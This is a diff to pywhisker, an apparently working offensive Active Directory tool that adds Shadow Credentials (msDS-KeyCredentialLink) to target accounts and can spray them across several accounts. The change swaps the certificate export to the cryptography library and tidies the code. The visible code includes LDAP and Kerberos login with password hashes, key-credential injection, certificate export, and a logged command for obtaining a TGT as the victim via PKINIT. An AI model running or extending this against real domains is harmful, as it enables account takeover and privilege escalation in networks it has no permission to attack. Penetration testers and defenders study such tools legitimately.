@@ -3,16 +3,15 @@
 # File name          : pywhisker.py
 # Author             : Charlie Bromberg (@_nwodtuhs) & Podalirius (@podalirius_)
 # Date created       : 29 Jul 2021
+# modified by        : Heimdall-42
+# Date modified      : 31 Dec 2024
+
 import json
 import random
 import string
 import traceback
 from binascii import unhexlify
 
-from impacket.smbconnection import SMBConnection
-from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
-from ldap3.protocol.formatters.formatters import format_sid
-from ldap3.utils.conv import escape_filter_chars
 import argparse
 import ldap3
 import ldapdomaindump
@@ -20,6 +19,18 @@ import os
 import ssl
 import sys
 
+# added for PFX-Export w/o pyOpenSSL
+from cryptography import x509
+from cryptography.hazmat.primitives.serialization.pkcs12 import serialize_key_and_certificates
+from cryptography.hazmat.primitives.serialization import BestAvailableEncryption, NoEncryption
+from cryptography.hazmat.backends import default_backend
+
+from impacket.smbconnection import SMBConnection
+from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
+from ldap3.protocol.formatters.formatters import format_sid
+from ldap3.utils.conv import escape_filter_chars
+
+# dsinternals
 from dsinternals.common.data.DNWithBinary import DNWithBinary
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 from dsinternals.system.Guid import Guid
@@ -27,6 +38,45 @@ from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
 from dsinternals.system.DateTime import DateTime
 
 from rich.console import Console
+
+from pyasn1.codec.ber import encoder, decoder
+from pyasn1.type.univ import noValue
+
+#####################################################################################
+#  Helper for PFX-Export with cryptography
+#####################################################################################
+def export_pfx_with_cryptography(pem_cert_file, pem_key_file, pfx_password=None, out_file='cert.pfx'):
+    with open(pem_cert_file, 'rb') as f:
+        pem_cert_data = f.read()
+    with open(pem_key_file, 'rb') as f:
+        pem_key_data = f.read()
+
+    cert_obj = x509.load_pem_x509_certificate(pem_cert_data, default_backend())
+
+    from cryptography.hazmat.primitives import serialization
+    key_obj = serialization.load_pem_private_key(pem_key_data, password=None, backend=default_backend())
+
+    # Password or NoEncryption
+    if pfx_password is None:
+        encryption_algo = NoEncryption()
+    else:
+        encryption_algo = BestAvailableEncryption(pfx_password.encode('utf-8'))
+
+    pfx_data = serialize_key_and_certificates(
+        name=b"ShadowCredentialCert",
+        key=key_obj,
+        cert=cert_obj,
+        cas=None,
+        encryption_algorithm=encryption_algo
+    )
+
+    with open(out_file, 'wb') as f:
+        f.write(pfx_data)
+
+    print(f"[+] PFX exportiert nach: {out_file}")
+    if pfx_password is not None:
+        print(f"[i] Passwort für PFX: {pfx_password}")
+
 
 def get_machine_name(args, domain):
     if args.dc_ip is not None:
@@ -42,19 +92,16 @@ def get_machine_name(args, domain):
         s.logoff()
     return s.getServerName() + '.' + s.getServerDNSDomainName()
 
+
 def init_ldap_schannel_connection(domain_controller, crt, key):
-    """
-    Initializes an LDAP connection using Schannel (certificate-based authentication).
-    """
-    #logger.debug("Creating LDAP connection using Schannel (TLS)")
     port = 636
     tls = ldap3.Tls(local_private_key_file=key, local_certificate_file=crt, validate=ssl.CERT_NONE)
     ldap_server_kwargs = {'use_ssl': True, 'port': port, 'tls': tls, 'get_info': ldap3.ALL}
     ldap_server = ldap3.Server(domain_controller, **ldap_server_kwargs)
     ldap_conn = ldap3.Connection(ldap_server)
-    #logger.debug(f"Attempting to open connection to {domain_controller} on port {port}")
     ldap_conn.open()
     return ldap_server, ldap_conn
+
 
 def init_ldap_connection(target, tls_version, args, domain, username, password, lmhash, nthash, logger):
     user = '%s\\%s' % (domain, username)
@@ -87,7 +134,6 @@ def init_ldap_connection(target, tls_version, args, domain, username, password, 
 def init_ldap_session(args, domain, username, password, lmhash, nthash, logger):
     if args.use_schannel:
         target = args.dc_ip if args.dc_ip is not None else domain
-        #self.logger.info("Using LDAP over Schannel (TLS) connection.")
         try:
             return init_ldap_schannel_connection(target, args.crt, args.key)
         except ldap3.core.exceptions.LDAPSocketOpenError:
@@ -110,36 +156,21 @@ def init_ldap_session(args, domain, username, password, lmhash, nthash, logger):
         return init_ldap_connection(target, None, args, domain, username, password, lmhash, nthash, logger)
 
 
-    from pyasn1.codec.ber import encoder, decoder
-    from pyasn1.type.univ import noValue
 def ldap3_kerberos_login(connection, target, user, password, logger, domain='', lmhash='', nthash='', aesKey='', kdcHost=None, TGT=None, TGS=None, useCache=True):
     """
-    logins into the target system explicitly using Kerberos. Hashes are used if RC4_HMAC is supported.
-    :param string user: username
-    :param string password: password for the user
-    :param string domain: domain where the account is valid for (required)
-    :param string lmhash: LMHASH used to authenticate using hashes (password is not used)
-    :param string nthash: NTHASH used to authenticate using hashes (password is not used)
-    :param string aesKey: aes256-cts-hmac-sha1-96 or aes128-cts-hmac-sha1-96 used for Kerberos authentication
-    :param string kdcHost: hostname or IP Address for the KDC. If None, the domain will be used (it needs to resolve tho)
-    :param struct TGT: If there's a TGT available, send the structure here and it will be used
-    :param struct TGS: same for TGS. See smb3.py for the format
-    :param bool useCache: whether or not we should use the ccache for credentials lookup. If TGT or TGS are specified this is False
-    :return: True, raises an Exception if error.
+    logins into the target system explicitly using Kerberos...
     """
-
     if lmhash != '' or nthash != '':
         if len(lmhash) % 2:
             lmhash = '0' + lmhash
         if len(nthash) % 2:
             nthash = '0' + nthash
-        try:  # just in case they were converted already
+        try:
             lmhash = unhexlify(lmhash)
             nthash = unhexlify(nthash)
         except TypeError:
             pass
 
-    # Importing down here so pyasn1 is not required if kerberos is not used.
     from impacket.krb5.ccache import CCache
     from impacket.krb5.asn1 import AP_REQ, Authenticator, TGS_REP, seq_set
     from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
@@ -150,15 +181,13 @@ def ldap3_kerberos_login(connection, target, user, password, logger, domain='', 
     if TGT is not None or TGS is not None:
         useCache = False
 
+    ccache = None
     if useCache:
         try:
             ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
         except Exception as e:
-            # No cache present
-            print(e)
             pass
         if ccache is not None:
-            # retrieve domain information from CCache file if needed
             if domain == '':
                 domain = ccache.principal.realm['data'].decode('utf-8')
                 logger.debug('Domain retrieved from CCache: %s' % domain)
@@ -168,7 +197,6 @@ def ldap3_kerberos_login(connection, target, user, password, logger, domain='', 
 
             creds = ccache.getCredential(principal)
             if creds is None:
-                # Let's try for the TGT and go from there
                 principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
                 creds = ccache.getCredential(principal)
                 if creds is not None:
@@ -180,7 +208,6 @@ def ldap3_kerberos_login(connection, target, user, password, logger, domain='', 
                 TGS = creds.toTGS(principal)
                 logger.debug('Using TGS from cache')
 
-            # retrieve user information from CCache file if needed
             if user == '' and creds is not None:
                 user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
                 logger.debug('Username retrieved from CCache: %s' % user)
@@ -188,7 +215,6 @@ def ldap3_kerberos_login(connection, target, user, password, logger, domain='', 
                 user = ccache.principal.components[0]['data'].decode('utf-8')
                 logger.debug('Username retrieved from CCache: %s' % user)
 
-    # First of all, we need to get a TGT for the user
     userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
     if TGT is None:
         if TGS is None:
@@ -206,19 +232,15 @@ def ldap3_kerberos_login(connection, target, user, password, logger, domain='', 
         cipher = TGS['cipher']
         sessionKey = TGS['sessionKey']
 
-        # Let's build a NegTokenInit with a Kerberos REQ_AP
-
     blob = SPNEGO_NegTokenInit()
-
-    # Kerberos
     blob['MechTypes'] = [TypesMech['MS KRB5 - Microsoft Kerberos 5']]
 
-    # Let's extract the ticket from the TGS
-    tgs = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
-    ticket = Ticket()
+    from impacket.krb5.asn1 import Ticket as Tickety
+    from pyasn1.codec.der import decoder as der_decoder
+    tgs = der_decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+    ticket = Tickety()
     ticket.from_asn1(tgs['ticket'])
 
-    # Now let's build the AP_REQ
     apReq = AP_REQ()
     apReq['pvno'] = 5
     apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
@@ -236,25 +258,20 @@ def ldap3_kerberos_login(connection, target, user, password, logger, domain='', 
     authenticator['cusec'] = now.microsecond
     authenticator['ctime'] = KerberosTime.to_asn1(now)
 
-    encodedAuthenticator = encoder.encode(authenticator)
+    from pyasn1.codec.ber import encoder as ber_encoder
+    encodedAuthenticator = ber_encoder.encode(authenticator)
 
-    # Key Usage 11
-    # AP-REQ Authenticator (includes application authenticator
-    # subkey), encrypted with the application session key
-    # (Section 5.5.1)
     encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 11, encodedAuthenticator, None)
-
     apReq['authenticator'] = noValue
     apReq['authenticator']['etype'] = cipher.enctype
     apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
 
-    blob['MechToken'] = encoder.encode(apReq)
+    from pyasn1.codec.ber import encoder as ber_encoder2
+    blob['MechToken'] = ber_encoder2.encode(apReq)
 
-    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO',
-                                                  blob.getData())
+    request = ldap3.operation.bind.bind_operation(connection.version, ldap3.SASL, user, None, 'GSS-SPNEGO', blob.getData())
 
-    # Done with the Kerberos saga, now let's get into LDAP
-    if connection.closed:  # try to open connection if closed
+    if connection.closed:
         connection.open(read_server_info=False)
 
     connection.sasl_in_progress = True
@@ -264,8 +281,8 @@ def ldap3_kerberos_login(connection, target, user, password, logger, domain='', 
         raise Exception(response)
 
     connection.bound = True
-
     return True
+
 
 class ShadowCredentials(object):
     def __init__(self, ldap_server, ldap_session, target_samname, target_domain=None, logger=None):
@@ -277,7 +294,7 @@ class ShadowCredentials(object):
         self.target_dn = None
         self.target_domain_dn = ','.join(f'DC={component}' for component in target_domain.split('.')) if target_domain is not None else None
         if logger is None:
-            self.logger = Logger(0,False)
+            self.logger = Logger(0, False)
         else:
             self.logger = logger
         self.logger.debug('Initializing domainDumper()')
@@ -364,6 +381,7 @@ class ShadowCredentials(object):
             self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
         return
 
+
     def add(self, password, path, export_type, domain, target_domain):
         self.logger.info("Searching for the target account")
         result = self.get_dn_sid_from_samname(self.target_samname)
@@ -411,12 +429,23 @@ class ShadowCredentials(object):
                     if password is None:
                         password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                         self.logger.verbose("No pass was provided. The certificate will be stored with the password: %s" % password)
-                    certificate.ExportPFX(password=password, path_to_file=path)
-                    self.logger.success("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                    certificate.ExportPEM(path_to_files=path)
+                    pem_cert_file = path + "_cert.pem"
+                    pem_key_file  = path + "_priv.pem"
+
+                    out_pfx_file = path + ".pfx"
+
+                    self.logger.info(f"Converting PEM -> PFX with cryptography: {out_pfx_file}")
+                    export_pfx_with_cryptography(pem_cert_file=pem_cert_file, 
+                                                 pem_key_file=pem_key_file,
+                                                 pfx_password=password,
+                                                 out_file=out_pfx_file)
+
+                    self.logger.success("Saved PFX (#PKCS12) certificate & key at path: %s" % out_pfx_file)
                     self.logger.info("Must be used with password: %s" % password)
                     self.logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                     self.logger.verbose("Run the following command to obtain a TGT")
-                    self.logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, target_domain if target_domain is not None else domain, self.target_samname, path))
+                    self.logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s -pfx-pass %s %s/%s %s.ccache" % (out_pfx_file, password, target_domain if target_domain is not None else domain, self.target_samname, path))
             else:
                 if self.ldap_session.result['result'] == 50:
                     self.logger.error('Could not modify object, the server reports insufficient rights: %s' % self.ldap_session.result['message'])
@@ -443,7 +472,6 @@ class ShadowCredentials(object):
         for samname in self.target_samname:
             result = self.get_dn_sid_from_samname(samname)
             if not result:
-                #self.logger.error(f'Target account does not exist! (wrong domain?): {samname}')
                 continue
             else:
                 self.target_dn = result[0]
@@ -456,7 +484,6 @@ class ShadowCredentials(object):
                     continue
                 results = entry
             if not results:
-                #self.logger.error(f'Could not query target user properties: {samname}')
                 continue
             try:
                 new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
@@ -468,8 +495,12 @@ class ShadowCredentials(object):
                         certificate.ExportPEM(path_to_files=f'{samname}_{path}')
                         self.logger.info(f"Saved PEM certificate for {samname} at path {samname + '_' + path + '_cert.pem'}, PEM private key at path {samname + '_' + path + '_priv.pem'}")
                     elif export_type == "PFX":
-                        certificate.ExportPFX(password=password, path_to_file=f'{samname}_{path}')
-                        self.logger.info(f"Saved PFX (#PKCS12) certificate & key for {samname} at path {samname + '_' + path + '.pfx'}, the password is {password}")
+                        certificate.ExportPEM(path_to_files=f'{samname}_{path}')
+                        pem_cert_file = f'{samname}_{path}_cert.pem'
+                        pem_key_file  = f'{samname}_{path}_priv.pem'
+                        out_pfx_file  = f'{samname}_{path}.pfx'
+                        export_pfx_with_cryptography(pem_cert_file, pem_key_file, password, out_pfx_file)
+                        self.logger.info(f"Saved PFX (#PKCS12) certificate & key for {samname} at path {out_pfx_file}, the password is {password}")
             except IndexError:
                 self.logger.info('Attribute msDS-KeyCredentialLink does not exist')
         if not targets_owned:
@@ -691,71 +722,18 @@ class Logger(object):
             art = """
 
 
-    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⡉⣉⡛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-    ⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⢀⣸⣿⣿⡿⠿⡯⢙⠿⣿⣿⣿⣿⣿⣿
-    ⣿⣿⣿⣿⣿⣿⡿⠄⠄⠄⠄⠄⡀⡀⠄⢀⣀⣉⣉⣉⠁⠐⣶⣶⣿⣿⣿⣿⣿⣿
-    ⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠁⣿⣿⣀⠈⠿⢟⡛⠛⣿⠛⠛⣿⣿⣿⣿⣿⣿⣿
-    ⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠈⠁⠰⣄⣴⡬⢵⣴⣿⣤⣽⣿⣿⣿⣿⣿⣿⣿
-    ⣿⣿⣿⣿⣿⣿⡇⠄⢀⢄⡀⠄⠄⠄⠄⡉⠻⣿⡿⠁⠘⠛⡿⣿⣿⣿⣿⣿⣿⣿
-    ⣿⣿⣿⣿⣿⡿⠃⠄⠄⠈⠻⠄⠄⠄⠄⢘⣧⣀⠾⠿⠶⠦⢳⣿⣿⣿⣿⣿⣿⣿
-    ⣿⣿⣿⣿⣿⣶⣤⡀⢀⡀⠄⠄⠄⠄⠄⠄⠻⢣⣶⡒⠶⢤⢾⣿⣿⣿⣿⣿⣿⣿
-    ⣿⣿⣿⣿⡿⠟⠋⠄⢘⣿⣦⡀⠄⠄⠄⠄⠄⠉⠛⠻⠻⠺⣼⣿⠟⠋⠛⠿⣿⣿
-    ⠋⠉⠁⠄⠄⠄⠄⠄⠄⢻⣿⣿⣶⣄⡀⠄⠄⠄⠄⢀⣤⣾⣿⣿⡀⠄⠄⠄⠄⢹
-    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⣿⣿⣷⡤⠄⠰⡆⠄⠄⠈⠉⠛⠿⢦⣀⡀⡀⠄
-    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⠟⡋⠄⠄⠄⢣⠄⠄⠄⠄⠄⠄⠄⠈⠹⣿⣀
-    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣷⣿⣿⣷⠄⠄⢺⣇⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿
-    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⡇⠄⠄⠸⣿⡄⠄⠈⠁⠄⠄⠄⠄⠄⣿
-    ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢻⣿⡇⠄⠄⠄⢹⣧⠄⠄⠄⠄⠄⠄⠄⠄⠘⠀⠀⠀⠀⠀⠀
-    
-⠀The best tools in the history of tools. Ever.
+    ⠀The best tools in the history of tools. Ever.
 """
             print(art)
             exit(0)
         elif verbosity == 5:
             art = """
 
-    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
-    ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
-    ⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
-    ⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
-    ⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
-    ⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
-    ⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
-    ⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
-    ⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
-    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
-    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
-    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁
-
-⠀ 🈵⠀STOP INCREASING VERBOSITY (PUNK!) 🈵⠀
-"""
-            print(art)
-            exit(0)
-
-        elif verbosity == 6:
-            art = """
-    ⣿⣿⣿⣿⣿⣿⠟⠋⠁⣀⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿
-    ⣿⣿⣿⣿⠋⠁⠀⠀⠺⠿⢿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣿
-    ⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⠀⠀⠀⠀⠀⣤⣦⣄⠀⠀
-    ⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⠏⣿⣿⣿⣿⣿⣁⠀⠀⠀⠛⠙⠛⠋⠀⠀
-    ⡿⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⣰⣿⣿⣿⣿⡄⠘⣿⣿⣿⣿⣷⠄⠀⠀⠀⠀⠀⠀⠀⠀
-    ⡇⠀⠀⠀⠀⠀⠀⠀⠸⠇⣼⣿⣿⣿⣿⣿⣷⣄⠘⢿⣿⣿⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀
-    ⠁⠀⠀⠀⣴⣿⠀⣐⣣⣸⣿⣿⣿⣿⣿⠟⠛⠛⠀⠌⠻⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀
-    ⠀⠀⠀⣶⣮⣽⣰⣿⡿⢿⣿⣿⣿⣿⣿⡀⢿⣤⠄⢠⣄⢹⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀
-    ⠀⠀⠀⣿⣿⣿⣿⣿⡘⣿⣿⣿⣿⣿⣿⠿⣶⣶⣾⣿⣿⡆⢻⣿⣿⠃⢠⠖⠛⣛⣷⠀
-    ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣮⣝⡻⠿⠿⢃⣄⣭⡟⢀⡎⣰⡶⣪⣿⠀
-    ⠀⠀⠘⣿⣿⣿⠟⣛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⡿⢁⣾⣿⢿⣿⣿⠏⠀
-    ⠀⠀⠀⣻⣿⡟⠘⠿⠿⠎⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⣿⣿⠧⣷⠟⠁⠀⠀
-    ⡇⠀⠀⢹⣿⡧⠀⡀⠀⣀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⢰⣿⠀⠀⠀⠀
-    ⡇⠀⠀⠀⢻⢰⣿⣶⣿⡿⠿⢂⣿⣿⣿⣿⣿⣿⣿⢿⣻⣿⣿⣿⡏⠀⠀⠁⠀⠀⠀⠀
-    ⣷⠀⠀⠀⠀⠈⠿⠟⣁⣴⣾⣿⣿⠿⠿⣛⣋⣥⣶⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
-    
     yamete kudasai !!!
 """
             print(art)
             exit(0)
-        elif verbosity > 6:
+        elif verbosity > 5:
             print("Sorry bruh, no more easter eggs")
             exit(0)
 
@@ -797,7 +775,7 @@ def parse_args():
     parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")
 
     authconn = parser.add_argument_group('authentication & connection')
-    authconn.add_argument('--dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter')
+    authconn.add_argument('--dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos.')
     authconn.add_argument("-d", "--domain", dest="auth_domain", metavar="DOMAIN", action="store", help="(FQDN) domain to authenticate to")
     authconn.add_argument("-u", "--user", dest="auth_username", metavar="USER", action="store", help="user to authenticate with")
     authconn.add_argument("-crt", "--certfile", dest="crt", metavar="CERTFILE", help="Path to the user certificate (PEM format) for Schannel authentication")
@@ -810,12 +788,12 @@ def parse_args():
     cred.add_argument("-p", "--password", dest="auth_password", metavar="PASSWORD", action="store", help="password to authenticate with")
     cred.add_argument("-H", "--hashes", dest="auth_hashes", action="store", metavar="[LMHASH:]NTHASH", help='NT/LM hashes, format is LMhash:NThash')
     cred.add_argument('--aes-key', dest="auth_key", action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
-    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
+    secret.add_argument("-k", "--kerberos", dest="use_kerberos", action="store_true", help='Use Kerberos authentication.')
 
     add = parser.add_argument_group('arguments when setting -action to add')
     add.add_argument("-P", "--pfx-password", action='store', help='password for the PFX stored self-signed certificate (will be random if not set, not needed when exporting to PEM)')
     add.add_argument("-f", "--filename", action='store', help='filename to store the generated self-signed PEM or PFX certificate and key, or filename for the "import"/"export" actions')
-    add.add_argument("-e", "--export", action='store', choices=["PEM","PFX"], type = lambda s : s.upper(), default="PFX", help='choose to export cert+private key in PEM or PFX (i.e. #PKCS12) (default: PFX))')
+    add.add_argument("-e", "--export", action='store', choices=["PEM","PFX"], type = lambda s : s.upper(), default="PFX", help='choose to export cert+private key in PEM or PFX (default: PFX)')
 
     remove = parser.add_argument_group('arguments when setting -action to remove')
     remove.add_argument("-D", "--device-id", action='store', help='device ID of the KeyCredentialLink to remove when setting -action to remove')
@@ -824,21 +802,22 @@ def parse_args():
         parser.print_help()
         sys.exit(1)
 
+    #if (args.action == "remove" or args.action == "info") and not hasattr(sys.argv, 'device_id'):
+    #    # fallback-check
+    #   pass
+
     args = parser.parse_args()
 
     if (args.action == "remove" or args.action == "info") and args.device_id is None:
         parser.error("the following arguments are required when setting -action == remove or info: -D/--device-id")
 
     if args.action == "import" and args.filename is None:
-        parser.error("the following arguments are required when setting -action == import or info: -f/--filename")
+        parser.error("the following arguments are required when setting -action == import: -f/--filename")
 
     return args
 
 
 def main():
-    #if args.action == 'write' and args.delegate_from is None:
-        #logger.error('`-delegate-from` should be specified when using `-action write` !')
-        #sys.exit(1)
     args = parse_args()
     logger = Logger(args.verbosity, args.quiet)
 
@@ -868,14 +847,34 @@ def main():
             auth_nt_hash = args.auth_hashes
 
     try:
-        ldap_server, ldap_session = init_ldap_session(args=args, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash, logger=logger)
+        ldap_server, ldap_session = init_ldap_session(
+            args=args,
+            domain=args.auth_domain,
+            username=args.auth_username,
+            password=args.auth_password,
+            lmhash=auth_lm_hash,
+            nthash=auth_nt_hash,
+            logger=logger
+        )
         shadowcreds = ShadowCredentials(ldap_server, ldap_session, target_samname, target_domain, logger)
         if args.action == 'list':
             shadowcreds.list()
         elif args.action == 'add':
-            shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain, target_domain=target_domain)
+            shadowcreds.add(
+                password=args.pfx_password,
+                path=args.filename,
+                export_type=args.export,
+                domain=args.auth_domain,
+                target_domain=target_domain
+            )
         elif args.action == 'spray':
-            shadowcreds.spray(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain, target_domain=target_domain)
+            shadowcreds.spray(
+                password=args.pfx_password,
+                path=args.filename,
+                export_type=args.export,
+                domain=args.auth_domain,
+                target_domain=target_domain
+            )
         elif args.action == 'remove':
             shadowcreds.remove(args.device_id)
         elif args.action == 'info':
@@ -890,6 +889,7 @@ def main():
         if args.verbosity >= 1:
             traceback.print_exc()
         logger.error(str(e))
+
 
 if __name__ == '__main__':
     main()
